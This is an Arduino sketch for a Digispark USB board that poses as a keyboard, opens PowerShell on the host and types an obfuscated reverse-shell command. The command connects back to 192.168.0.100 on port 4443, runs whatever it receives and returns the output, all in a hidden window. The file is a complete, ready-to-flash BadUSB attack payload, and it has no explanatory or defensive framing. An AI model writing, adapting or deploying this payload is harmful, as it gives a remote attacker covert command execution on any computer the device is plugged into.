#include "DigiKeyboard.h"


void setup() {
  // Initialize DigiKeyboard
  DigiKeyboard.delay(100);

  // Open PowerShell
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  String pays = "Start-Process $PSHOME\\powershell.exe -ArgumentList {$client = N''e\"\"w-O'b'je\"c\"t System.Net.Sockets.TCPClient('192.168.0.100',4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (N\'\'e\'w\'-O\'\'b\"\"je\'c\'t -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (i\'\'e\"\"x $data 2>&1 | O\"\"u\'\'t-S\'\'t\"\"ring );$sendback2 = $sendback + 'PS' + (p\"\"w''d).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hidden";

  // Type and execute a PowerShell command
  DigiKeyboard.print(pays);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

}

void loop() {
  digitalWrite(1, HIGH);
  delay(200);
  
  digitalWrite(1, LOW);
  delay(300);
}
